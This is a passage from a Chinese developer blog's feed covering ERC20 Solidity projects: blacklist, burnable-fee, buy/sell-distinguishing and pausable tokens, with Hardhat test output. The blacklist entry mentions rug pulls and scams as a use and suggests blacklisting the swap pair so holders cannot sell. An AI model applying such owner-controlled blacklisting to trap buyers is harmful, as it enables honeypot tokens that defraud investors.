<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211029094938.png" alt="20211029094938" /></p>
<p>token基本都是符合<code>erc20</code>标准,都含有标准的<code>Transfer</code>函数要知道该次交易里token的传输记录，要解析log里的<code>Transfer event</code></p>
<p>但并不是所有log里，都能看到<code>Transfer</code>的字眼<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211029100319.png" alt="20211029100319" /></p>
<p>有的就没有<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211029100713.png" alt="20211029100713" /></p>
<p>由于符合erc20标准的代币的<code>Transfer(address from, address to, uint256 value)</code>函数是固定的，经过<code>keccak</code>哈希后,可得到哈希字符串<code>0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef</code></p>
<p>如果该次交易里含有erc20代币的传输，那么就存在含有该哈希的<code>event</code>.<br />
接下来去解析这些<code>event</code>就可以知道token的传输记录了</p>
<p>参考:<a href="https://stackoverflow.com/questions/52222758/erc20-tokens-transferred-information-from-transaction-hash">ERC20 Tokens Transferred Information from Transaction Hash</a></p>
<hr />
<h1>Bug&amp;Todo:</h1>
<h2 id="个人地址转账">个人地址转账:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211103115056.png" alt="20211103115056" /></p>
<p>如何判断一个地址是合约地址还是个人地址？</p>
<p><a href="https://ethereum.stackexchange.com/questions/28521/how-to-detect-if-an-address-is-a-contract">How to detect if an address is a contract?</a></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211103115835.png" alt="20211103115835" /></p>
<p>个人地址的转账记录这块还没做对应的解析</p>
<h2 id="SSL-error">SSL error:</h2>
<p>[SSL: DECRYPTION_FAILED_OR_BAD_RECORD_MAC] decryption failed or bad record mac (_ssl.c:2570)</p>
<h2 id="normal">normal</h2>
<p>只用了bscscan的这个<code>Get a list of 'Normal' Transactions By Address</code>接口，还有一些交易类型没收录进去，仍有欠缺</p>
<hr />
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://medium.com/coinmonks/discovering-the-secrets-of-an-ethereum-transaction-64febb00935c">Unlocking the Secrets of an Ethereum Transaction</a></p>
</li>
<li class="lvl-2">
<p><a href="https://stackoverflow.com/questions/55258332/find-the-function-name-and-parameter-from-input-data">Find the function name and parameter from input data</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.4byte.directory/">https://www.4byte.directory/</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/mikeshultz/py4byte">py4byte</a></p>
</li>
<li class="lvl-2">
<p><a href="https://stackoverflow.com/questions/48004356/get-token-transfer-detail-from-transaction-hash-with-web3js">Get token transfer detail from transaction hash with web3js</a></p>
</li>
<li class="lvl-2">
<p><a href="https://ethereum.stackexchange.com/questions/80135/getting-tokens-transferred-from-web3-py">Getting Tokens Transferred from Web3.py</a></p>
</li>
<li class="lvl-2">
<p><a href="https://zhuanlan.zhihu.com/p/389359014">web3.py extraData 错误</a></p>
</li>
<li class="lvl-2">
<p><a href="https://code.z01.com/bootstrap-vue/docs/">bootstrapvue中文文档</a></p>
</li>
<li class="lvl-2">
<p><a href="https://zhuanlan.zhihu.com/p/311323583">用Flask和Vue制作一个单页应用（一）</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Project</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Project-CoolErc20-blacklist-具备黑名单代币</title>
    <url>/2022/24654.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>实现一个具有黑名单功能的erc20代币<br />
github仓库地址: <code>https://github.com/jerrychan807/cool-erc20/tree/main/blacklist</code></p>
<h1>需求:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>黑名单用户无法正常<code>transfer</code></p>
</li>
<li class="lvl-2">
<p>管理员可配置黑名单里的地址</p>
</li>
</ul>
<h1>业务场景：</h1>
<p>暂时能想到的</p>
<table>
<thead>
<tr>
<th>项目方</th>
<th>目的</th>
</tr>
</thead>
<tbody>
<tr>
<td>好人</td>
<td>将恶意用户、抢跑用户、机器人、非正常渠道获得大量代币的用户加入黑名单，相当于冻结它的资产</td>
</tr>
<tr>
<td>坏人</td>
<td>rug、scam</td>
</tr>
</tbody>
</table>
<p>还想到一个骚操作，如果把swap的地址加入黑名单列表。。🤣也可以使得该erc20代币 无法正常的与swap交互，无法买卖、添加移除流动性。</p>
<h1>部署：</h1>
<p>如果是在<code>hardhat</code>环境的话，不用先执行编译、部署了，可以直接<code>yarn hardhat test</code>，会默认执行前两步。</p>
<h1>编写合约：</h1>
<h2 id="黑名单判断：">黑名单判断：</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">_beforeTokenTransfer</span>(<span class="params"></span></span><br><span class="line"><span class="params">    address <span class="keyword">from</span>,</span></span><br><span class="line"><span class="params">    address to,</span></span><br><span class="line"><span class="params">    uint256 amount</span></span><br><span class="line"><span class="params"></span>) internal override &#123;</span><br><span class="line">    <span class="comment">// 错误写法：只要一个为非黑名单即可</span></span><br><span class="line">    <span class="comment">// require( !_blackList[from] || !_blackList[to], &quot;ERC20: user in black list&quot;);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 正确写法：同时都为非黑名单</span></span><br><span class="line">    <span class="comment">// require( !_blackList[to], &quot;ERC20: &#x27;to&#x27; address in black list&quot;);</span></span><br><span class="line">    <span class="comment">// require( !_blackList[from], &quot;ERC20: &#x27;from&#x27; address in black list&quot;);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 正确写法：同时都为非黑名单</span></span><br><span class="line">    <span class="built_in">require</span>( !_blackList[to] &amp;&amp;  !_blackList[<span class="keyword">from</span>], <span class="string">&quot;ERC20: &#x27;to&#x27; or &#x27;from&#x27; address in black list&quot;</span>);</span><br><span class="line">    <span class="variable language_">super</span>.<span class="title function_">_beforeTokenTransfer</span>(<span class="keyword">from</span>, to, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一开始觉得这个erc20合约很简单，结果一写到黑名单判断的时候，第一次就写错了。。😅<br />
还发现正确写法有两种，其中第一种可以更清晰地把错误原因写清楚。</p>
<blockquote>
<p>看来还是要多code，多实践才行</p>
</blockquote>
<h1>测试：</h1>
<h2 id="Mocha测试框架">Mocha测试框架</h2>
<p>在写测试脚本时，有一个目前没接触过的测试需求：需要给用户设置黑名单后，给这个用户转账，然后希望这次转账报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 希望该函数报错的写法</span></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">expect</span>(tokenOwner.<span class="property">Token</span>.<span class="title function_">transfer</span>(users[<span class="number">0</span>].<span class="property">address</span>, amountWei)).<span class="property">to</span>.<span class="property">be</span>.<span class="property">reverted</span>;</span><br></pre></td></tr></table></figure>
<p>在查文档的时候才知道。。<code>hardhat</code>用到的是一个叫<code>Mocha</code>的测试框架，后续如果还遇到新的测试需求可以查阅该文档。</p>
<blockquote>
<p>Mocha是一个能够运行在Node和浏览器中的多功能的JavaScript测试框架，它让异步测试简单且有趣。</p>
<p>Mocha连续地运行测试，并给出灵活而精确的报告，同时能够将错误精确地映射到测试用例上。它托管在GitHub上。</p>
</blockquote>
<h2 id="测试结果：">测试结果：</h2>
<p>符合预期：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  Token contract</span><br><span class="line">    Transfer</span><br><span class="line"> Before Transfer: </span><br><span class="line">【Step 1】tokenOwnerBalance(Ether): 1000.0</span><br><span class="line">【Step 1】userBalance(Ether): 0.0</span><br><span class="line"> Transfer: </span><br><span class="line">【Step 2】tokenOwner -&gt; 100-&gt; user0: </span><br><span class="line">【Step 2】tokenOwnerBalance(Ether): 900.0</span><br><span class="line">【Step 2】userBalance(Ether): 100.0</span><br><span class="line"> Set blacklist: </span><br><span class="line">【Step 3】tokenOwner Set user0 in blacklist: </span><br><span class="line">【Step 3】user0IfBlackList: true</span><br><span class="line"> After setting blacklist, try : </span><br><span class="line">【Step 4】tokenOwner Set user0 in blacklist and try to transfer: </span><br><span class="line">【Step 4】 expect : tokenOwner -&gt; 100-&gt; user0 to.be.reverted</span><br><span class="line">【Step 4】userBalance(Ether): 100.0</span><br><span class="line">      ✔ can&#x27;t transfer after setting blacklist (1351ms)</span><br><span class="line"></span><br><span class="line">  1 passing (1s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>Summary:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>看来还是要多code，多实践才行，再简单的需求，真正写起来的时候也很有可能出错。</p>
</li>
<li class="lvl-2">
<p>写<code>hardhat</code>测试脚本时，如果遇到没见过的测试需求，可以查阅<code>mocha</code>的文档</p>
</li>
<li class="lvl-2">
<p>比如平时有看到别的项目用hardhat构建的，可以参考里面的test脚本，学学别人的写法</p>
</li>
<li class="lvl-2">
<p>实践出真知🧐🧐🧐</p>
</li>
<li class="lvl-2">
<p>实践出真知🧐🧐🧐</p>
</li>
<li class="lvl-2">
<p>实践出真知🧐🧐🧐</p>
</li>
</ul>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/yuichiroaoki/poly-flash/blob/main/test/bsc/bscUniswapV2.test.ts">poly-flash 参考里面的test脚本</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.jianshu.com/p/9c78548caffa">Mocha.js官方文档翻译 —— 简单、灵活、有趣</a></p>
</li>
<li class="lvl-2">
<p><a href="https://mochajs.bootcss.com/#inclusive-tests">Mocha中文文档1</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.wanxiangyundang.top/read/mocha-in-chinese/EXCLUSIVE.md">Mocha中文文档2</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Project</category>
      </categories>
      <tags>
        <tag>SmartContract</tag>
        <tag>Project</tag>
        <tag>CoolErc20</tag>
      </tags>
  </entry>
  <entry>
    <title>Project-CoolErc20-burnable-燃烧通缩代币</title>
    <url>/2022/21702.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>实现一个燃烧通缩的erc20代币<br />
github仓库地址: <code>https://github.com/jerrychan807/cool-erc20/tree/main/burnable</code></p>
<h1>需求:</h1>
<p>代币发生转移时：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>进行燃烧通缩（4%），<code>TotalSupply</code>减少</p>
</li>
<li class="lvl-2">
<p>税收（1%）留在合约里</p>
</li>
<li class="lvl-2">
<p>管理员可以从合约里提取代币</p>
</li>
</ul>
<h1>部署：</h1>
<p><code>hardhat.config.ts</code>里的编译器版本可以参考<code>remix</code>给出的版本</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220615100322.png" alt="20220615100322" /></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220615100602.png" alt="20220615100602" /></p>
<h1>编写合约：</h1>
<h2 id="使用openzeppelin库：">使用openzeppelin库：</h2>
<blockquote>
<p>OpenZeppelin 库是一个开发框架，可以简化智能合约和 Dapp 的开发，基于已经成熟（严格审计）的代码还能增加安全性，其代码库常年保持着较高的更新频率</p>
</blockquote>
<p>使用感受：里面有很多轮子，用起来很方便，合约类直接继承很多工具类库，不用自己自定义多余的函数，在减少代码量的同时还保证了安全性。后面计划多熟悉一下这个库里的内容。</p>
<p>在solidity里的具体导入路径，可以参考他们github仓库里的文件夹结构</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"># solidity里<span class="keyword">import</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220615095423.png" alt="20220615095423" /></p>
<h2 id="合约接受代币：">合约接受代币：</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">receive</span>() external payable &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>加上这个函数之后，合约才能正常接受代币</p>
<h2 id="合约里提取代币">合约里提取代币:</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/access/Ownable.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Withdraw</span> is <span class="title class_">Ownable</span>, <span class="title class_">ReentrancyGuard</span> &#123;</span><br><span class="line">    event <span class="title class_">Withdrawal</span>(address indexed sender, uint256 amount);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdrawToken</span>(<span class="params"></span></span><br><span class="line"><span class="params">        IERC20 token,</span></span><br><span class="line"><span class="params">        address _to,</span></span><br><span class="line"><span class="params">        uint256 _value</span></span><br><span class="line"><span class="params">    </span>) public onlyOwner nonReentrant &#123;</span><br><span class="line">        <span class="built_in">require</span>(token.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)) &gt;= _value, <span class="string">&quot;Not enough token&quot;</span>);</span><br><span class="line">        <span class="title class_">SafeERC20</span>.<span class="title function_">safeTransfer</span>(token, _to, _value);</span><br><span class="line">        emit <span class="title class_">Withdrawal</span>(_to, _value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继承<code>Withdraw</code>，后面调用<code>withdrawToken</code>就可以从合约里提取指定数量的指定代币。</p>
<h1>测试：</h1>
<h2 id="使用remix测试：">使用remix测试：</h2>
<p>把代码copy到remix上，先做一些语法检查然后直接在remix上做一些简单的测试，再用hardhat编写测试脚本，提高复用率</p>
<h2 id="使用hardhat环境测试：">使用hardhat环境测试：</h2>
<h3 id="fixture">fixture:</h3>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// it first ensure the deployment is executed and reset (use of evm_snaphost for fast test)</span></span><br><span class="line">  <span class="keyword">await</span> deployments.<span class="title function_">fixture</span>([<span class="string">&quot;Token&quot;</span>]);</span><br></pre></td></tr></table></figure>
<p>在每一部分测试前，都会调用到这个函数，相当于恢复快照到初始部署的时候。真实的测试网络就不支持该功能。</p>
<h3 id="使用感受">使用感受</h3>
<table>
<thead>
<tr>
<th>x</th>
<th>感受</th>
</tr>
</thead>
<tbody>
<tr>
<td>优点</td>
<td>相比真实的测试环境来说，速度快得多</td>
</tr>
<tr>
<td>缺点</td>
<td>真实测试环境可以借<code>browser</code>,<code>tenderly</code> Debug，直观一些</td>
</tr>
</tbody>
</table>
<h2 id="测试结果：-2">测试结果：</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>Deployment</p>
<ul class="lvl-2">
<li class="lvl-6"><input type="checkbox" id="checkbox0" checked="true" /><label for="checkbox0">set the right owner</label></li>
<li class="lvl-6"><input type="checkbox" id="checkbox1" checked="true" /><label for="checkbox1">Deployment,total supply = token owner balance</label></li>
</ul>
</li>
<li class="lvl-2">
<p>Transactions</p>
<ul class="lvl-2">
<li class="lvl-6"><input type="checkbox" id="checkbox2" checked="true" /><label for="checkbox2">tokenOwner —transfer–&gt; user</label></li>
<li class="lvl-6"><input type="checkbox" id="checkbox3" checked="true" /><label for="checkbox3">userA —transfer–&gt; userB（Fee）,totalsupply</label><code>↓</code>,balance of contract <code>↑</code></li>
</ul>
</li>
<li class="lvl-2">
<p>tokenOwner withdraw</p>
<ul class="lvl-2">
<li class="lvl-6"><input type="checkbox" id="checkbox4" checked="true" /><label for="checkbox4">tokenOwner withdraw from contract After userA to userB</label></li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  Token contract</span><br><span class="line">    Deployment</span><br><span class="line">      ✔ Should set the right owner (1127ms)</span><br><span class="line">      ✔ Should assign the total supply of tokens to the owner (65ms)</span><br><span class="line">    Transactions</span><br><span class="line">users0Balance: 100.0</span><br><span class="line">      ✔ Should transfer tokens from tokenOwner to user (78ms)</span><br><span class="line">users1ShouldGet: 47.5</span><br><span class="line">totalSupplyBefore: 1000.0</span><br><span class="line">totalSupplyAfter: 998.0</span><br><span class="line">contractBalanceWei: 0.5</span><br><span class="line">contractShouldGet: 0.5</span><br><span class="line">      ✔ Should transfer tokens from user1 to user2 (139ms)</span><br><span class="line">    tokenOwner withdraw from contract</span><br><span class="line">tokenOwnerBalanceWeiBefore: 900.0</span><br><span class="line">contractBalanceWei: 0.5</span><br><span class="line">contractBalanceWeiNow: 0.0</span><br><span class="line">tokenOwnerBalanceWeiAfter: 900.5</span><br><span class="line">tokenOwnerShouldGet: 900.5</span><br><span class="line">      ✔ tokenOwner withdraw from contract (162ms)</span><br><span class="line"></span><br><span class="line">  5 passing (2s)</span><br><span class="line"></span><br><span class="line">✨  Done in 5.62s.</span><br></pre></td></tr></table></figure>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://blog.csdn.net/sanqima/article/details/120388853">openzeppelin与solidity版本对应关系</a></p>
</li>
<li class="lvl-2">
<p><a href="https://docs.openzeppelin.com/contracts/4.x/">https://docs.openzeppelin.com/contracts/4.x/</a></p>
</li>
<li class="lvl-2">
<p><a href="https://learnblockchain.cn/article/3228">使用hardhat一步一步构建智能合约演示项目开箱即用(最易上手操作)</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts">https://github.com/OpenZeppelin/openzeppelin-contracts</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Project</category>
      </categories>
      <tags>
        <tag>SmartContract</tag>
        <tag>Project</tag>
        <tag>CoolErc20</tag>
      </tags>
  </entry>
  <entry>
    <title>Project-CoolErc20-four_way-区分买卖添加移除流动性行为的代币</title>
    <url>/2022/14814.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>Erc20代币在买卖、添加/移除流动性的多个行为的过程中，都会调用到<code>Transfer()</code>函数,在代码层面上是只有转移的行为。那么如何在solidity里区分这几个行为呢？如果能够区分这几个行为的话，就能实现某些功能的定制化,例如税收等。</p>
<p>github仓库地址: <code>https://github.com/jerrychan807/cool-erc20/tree/main/four_way</code></p>
<h1>Token转移：</h1>
<p>token发生转移时，会有发送方<code>sender</code>,接收方<code>recipient</code>可以把Buy、Sell、AddLiquidity、RemoveLiquidity分类为下面两种情况。</p>
<ol>
<li class="lvl-3">
<p><code>sender</code>为Pair，<code>recipient</code>为Token</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Buy:</span><br><span class="line">Usdt ——&gt; Pair ——&gt; Token</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RemoveLiquidity:</span><br><span class="line">LpToken ——&gt; Pair ——&gt; Usdt、Token</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p><code>sender</code>为Token，<code>recipient</code>为Pair</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sell:</span><br><span class="line">Token ——&gt; Pair ——&gt; Usdt</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddLiquidity:</span><br><span class="line">Usdt、Token ——&gt; Pair ——&gt; LpToken</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>行为</th>
<th>sender</th>
<th>recipient</th>
</tr>
</thead>
<tbody>
<tr>
<td>Buy</td>
<td>Pair</td>
<td>Token</td>
</tr>
<tr>
<td>Sell</td>
<td>Token</td>
<td>Pair</td>
</tr>
<tr>
<td>AddLiquidity</td>
<td>Token</td>
<td>Pair</td>
</tr>
<tr>
<td>RemoveLiquidity</td>
<td>Pair</td>
<td>Token</td>
</tr>
</tbody>
</table>
<p>那如何在smart contract里区分这四种行为呢？</p>
<h1>在smart contract里区分：</h1>
<p>关键的判断代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 查询uniswap储备量</span></span><br><span class="line"><span class="comment">// 实例化pair</span></span><br><span class="line"><span class="title class_">IUniswapV</span>2Pair uniswapV2Pair = <span class="title class_">IUniswapV</span>2Pair(uniswapV2PairAddress);</span><br><span class="line"><span class="comment">// 获取上一次swap的结果</span></span><br><span class="line">(uint112 reserve0, uint112 reserve1,) = uniswapV2Pair.<span class="title function_">getReserves</span>();</span><br><span class="line"><span class="comment">// Buy: Usdt↑ Token↓</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="title function_">address</span>(<span class="variable language_">this</span>) == uniswapV2Pair.<span class="title function_">token0</span>() &amp;&amp; <span class="title class_">IERC20</span>(usdtAddress).<span class="title function_">balanceOf</span>(uniswapV2PairAddress) &gt; reserve1) </span><br><span class="line">|| (<span class="title function_">address</span>(<span class="variable language_">this</span>) == uniswapV2Pair.<span class="title function_">token1</span>() &amp;&amp; <span class="title class_">IERC20</span>(usdtAddress).<span class="title function_">balanceOf</span>(uniswapV2PairAddress) &gt; reserve0)) &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>通过储备量的变化情况，来区分开这四种行为。</p>
<h1>测试情况：</h1>
<h2 id="手动测试网测试">手动测试网测试:</h2>
<table>
<thead>
<tr>
<th>行为</th>
<th>Fee</th>
</tr>
</thead>
<tbody>
<tr>
<td>Buy</td>
<td>5%</td>
</tr>
<tr>
<td>Sell</td>
<td>10%</td>
</tr>
<tr>
<td>AddLiquidity</td>
<td>5%</td>
</tr>
<tr>
<td>RemoveLiquidity</td>
<td>10%</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>行为</th>
<th>Result</th>
<th>tx</th>
</tr>
</thead>
<tbody>
<tr>
<td>Buy</td>
<td>ok</td>
<td><a href="https://testnet.bscscan.com/tx/0x8e937af584c94bfbd1f5280c2a382a2812301178f9d5f3498fe3a75dc24bf285">tx</a></td>
</tr>
<tr>
<td>Sell</td>
<td>fail</td>
<td>tx</td>
</tr>
<tr>
<td>AddLiquidity</td>
<td>ok</td>
<td><a href="https://testnet.bscscan.com/tx/0x7ed0f97a08896a0f1059ae15c2ff42dcd16370f755f386aafad76d861da51879">tx</a></td>
</tr>
<tr>
<td>RemoveLiquidity</td>
<td>ok</td>
<td><a href="https://testnet.bscscan.com/tx/0x2e837f4e94c9f8e47490911f1c2d9953ed92e598f4976724444076f160da2cb3">tx</a></td>
</tr>
</tbody>
</table>
<h2 id="hardhat测试：">hardhat测试：</h2>
<p>也是<code>Sell</code>这一步骤没能成功</p>
<h1>一些知识点：</h1>
<h2 id="Uniswap的getreserves获取储备量函数">Uniswap的getreserves获取储备量函数</h2>
<p>可以通过<code>getreserves()</code>获取pair里两类币种的储备量。</p>
<table>
<thead>
<tr>
<th>行为</th>
<th>reserve0(USDT)储备量变化</th>
<th>reserve1（XToken）储备量变化</th>
</tr>
</thead>
<tbody>
<tr>
<td>Buy</td>
<td>↓</td>
<td>↑</td>
</tr>
<tr>
<td>Sell</td>
<td>↑</td>
<td>↓</td>
</tr>
<tr>
<td>AddLiquidity</td>
<td>↑</td>
<td>↑</td>
</tr>
<tr>
<td>RemoveLiquidity</td>
<td>↓</td>
<td>↓</td>
</tr>
</tbody>
</table>
<h2 id="在合约里调用其他合约">在合约里调用其他合约</h2>
<p>interface + 地址</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;./IUniswapV2Factory.sol&quot;</span>;</span><br><span class="line"><span class="comment">// bsc testnet addr</span></span><br><span class="line">address v2FactoryAddress = <span class="number">0x182859893230dC89b114d6e2D547BFFE30474a21</span>;</span><br><span class="line"><span class="title class_">IUniswapV</span>2Factory uniswapv2Factory = <span class="title class_">IUniswapV</span>2Factory(v2FactoryAddress);</span><br><span class="line">uniswapV2PairAddress = uniswapv2Factory.<span class="title function_">createPair</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>), usdtAddress);</span><br></pre></td></tr></table></figure>
<h2 id="验证多合约源码：">验证多合约源码：</h2>
<ol>
<li class="lvl-3">
<p>etherscan、bscscan直接将多个源代码文件上传即可</p>
</li>
<li class="lvl-3">
<p><a href="https://blog.csdn.net/weixin_43405220/article/details/122256055">使用Hardhat验证 Solidity 源码 （Ethereum or BSC）</a></p>
</li>
</ol>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://docs.uniswap.org/protocol/V2/reference/smart-contracts/pair">uniswap doc</a></p>
</li>
<li class="lvl-2">
<p><a href="https://solveforum.com/forums/threads/solved-hardhat-testing-on-testnet-rinkeby.467949/">[Solved] Hardhat testing on testnet (Rinkeby)</a></p>
</li>
<li class="lvl-2">
<p><a href="https://learnblockchain.cn/question/3458">限制用户卖出币的数量，同时加池子不受影响</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Project</category>
      </categories>
      <tags>
        <tag>SmartContract</tag>
        <tag>Project</tag>
        <tag>CoolErc20</tag>
      </tags>
  </entry>
  <entry>
    <title>Project-CoolErc20-pauseable-可暂停代币</title>
    <url>/2022/35217.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>参考OpenZeppelin的<code>ERC20Pausable.sol</code>，实现一个可暂停的erc20代币<br />
github仓库地址: <code>https://github.com/jerrychan807/cool-erc20/tree/main/pauseable</code></p>
<h1>需求:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>管理员可配置暂停开关</p>
</li>
<li class="lvl-2">
<p>暂停后无法正常<code>transfer</code></p>
</li>
<li class="lvl-2">
<p>解除暂停后可正常<code>transfer</code></p>
</li>
</ul>
<h1>业务场景：</h1>
<p>出bug的时候，可以由管理员设置暂停开关，阻止代币的传输、铸造和燃烧等功能，相当于一个紧急停止机制。</p>
<h1>部署：</h1>
<p>无</p>
<h1>编写合约：</h1>
<h2 id="可不写super关键字">可不写super关键字</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父类</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_pause</span>(<span class="params"></span>) internal virtual whenNotPaused &#123;</span><br><span class="line">    _paused = <span class="literal">true</span>;</span><br><span class="line">    emit <span class="title class_">Paused</span>(<span class="title function_">_msgSender</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 子类</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setPause</span>(<span class="params"></span>) public <span class="title function_">onlyOwner</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// super._pause();</span></span><br><span class="line">    <span class="title function_">_pause</span>();  <span class="comment">// 这两种写法都可以</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用父类的函数时，不一定都要写<code>super</code>，当在<strong>继承关系图谱</strong>中存在唯一的父类函数，这种情况下可以不显示写<code>super</code>关键字</p>
<h1>测试：</h1>
<p>简单合约的话，依旧是在remix上简单编写，做语法check<br />
然后放到hardhat框架里写测试script</p>
<h2 id="测试结果：-3">测试结果：</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  Token contract</span><br><span class="line">    can&#x27;t transfer after set pause,can transfer after set Unpause</span><br><span class="line"> Before Transfer: </span><br><span class="line">【Step 1】tokenOwnerBalance(Ether): 1000.0</span><br><span class="line">【Step 1】userBalance(Ether): 0.0</span><br><span class="line"> Transfer: </span><br><span class="line">【Step 2】tokenOwner -&gt; 100-&gt; user0: </span><br><span class="line">【Step 2】tokenOwnerBalance(Ether): 900.0</span><br><span class="line">【Step 2】userBalance(Ether): 100.0</span><br><span class="line"> Pause: </span><br><span class="line">【Step 3】tokenOwner Set Pause: </span><br><span class="line">【Step 3】paused Switch: true</span><br><span class="line"> After setting pause, try to transfer: </span><br><span class="line">【Step 4】 expect : tokenOwner -&gt; 100-&gt; user0 to.be.reverted</span><br><span class="line">【Step 4】userBalance(Ether): 100.0</span><br><span class="line"> UnPause: </span><br><span class="line">【Step 5】tokenOwner Set UnPause: </span><br><span class="line">【Step 5】paused Switch: false</span><br><span class="line"> After setting Unpause, try to transfer: </span><br><span class="line">【Step 6】 expect : tokenOwner -&gt; 100-&gt; user0 to be not reverted</span><br><span class="line">【Step 6】userBalance(Ether): 200.0</span><br><span class="line">      ✔  (1446ms)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  1 passing (1s)</span><br><span class="line"></span><br><span class="line">✨  Done in 5.12s.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Project</category>
      </categories>
      <tags>
        <tag>SmartContract</tag>
        <tag>Project</tag>
        <tag>CoolErc20</tag>
      </tags>
  </entry>
  <entry>
    <title>Project-CoolErc20-snapshot-快照功能代币</title>
    <url>/2022/8661.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>参考<code>openzeppelin</code>里的<code>ERC20Snapshot</code>，实现一个具有快照功能的erc20代币<br />
github仓库地址: <code>https://github.com/jerrychan807/cool-erc20/tree/main/snapshot</code></p>
<h1>需求:</h1>
